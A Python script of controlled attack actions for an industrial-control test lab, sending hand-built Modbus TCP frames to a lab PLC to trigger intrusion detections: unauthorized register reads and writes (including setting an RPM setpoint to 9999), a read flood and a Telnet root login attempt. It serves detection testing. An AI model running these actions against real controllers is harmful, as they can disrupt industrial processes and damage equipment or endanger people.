"""Controlled OT attack actions, injected into the live OT lab by
tools/ot_lab_scenarios.py (read from stdin and run by argument, exactly like
the IoT lab's attacks.py). Everything targets the lab PLC only.

    python - <action> < simulator/ot_attacks.py
"""

from __future__ import annotations

import socket
import struct
import sys
import time

PLC = "192.168.10.20"
UNIT = 1


def _mbap(txid, pdu):
    return struct.pack(">HHHB", txid, 0, len(pdu) + 1, UNIT) + pdu


def _recv(sock):
    try:
        head = sock.recv(6)
        if len(head) == 6:
            sock.recv(struct.unpack(">HHH", head)[2])
    except OSError:
        pass


def _read(sock, txid, addr=0, qty=10):
    sock.sendall(_mbap(txid, struct.pack(">BHH", 3, addr, qty)))
    _recv(sock)


def _write(sock, txid, addr, value):
    sock.sendall(_mbap(txid, struct.pack(">BHH", 6, addr, value)))
    _recv(sock)


def unauthorized_read():
    """An unapproved client reads the PLC's registers (DET-011, + DET-012 if cross-zone)."""
    with socket.create_connection((PLC, 502), timeout=5) as s:
        for i in range(5):
            _read(s, i, addr=0, qty=10)
            time.sleep(0.5)


def unauthorized_write():
    """An unapproved client writes the RPM setpoint (DET-011 critical)."""
    with socket.create_connection((PLC, 502), timeout=5) as s:
        _read(s, 1, addr=0, qty=5)
        _write(s, 2, addr=40, value=9999)


def modbus_flood():
    """Hammer the PLC with register reads: a polling flood / enumeration (DET-014)."""
    with socket.create_connection((PLC, 502), timeout=5) as s:
        for i in range(300):
            _read(s, i & 0xFFFF, addr=(i * 10) % 120, qty=10)


def telnet():
    """Open a Telnet session to the PLC: a protocol that does not belong in OT (DET-013)."""
    try:
        with socket.create_connection((PLC, 23), timeout=3) as s:
            s.sendall(b"root\r\n")
            time.sleep(0.5)
            s.recv(64)
    except OSError:
        pass  # the PLC may refuse; the SYN/attempt is what the monitor needs


ACTIONS = {
    "unauthorized-read": unauthorized_read,
    "unauthorized-write": unauthorized_write,
    "flood": modbus_flood,
    "telnet": telnet,
}


def main() -> int:
    action = sys.argv[1] if len(sys.argv) > 1 else ""
    if action not in ACTIONS:
        print(f"usage: {sys.argv[0]} {{{'|'.join(ACTIONS)}}}", file=sys.stderr)
        return 2
    ACTIONS[action]()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
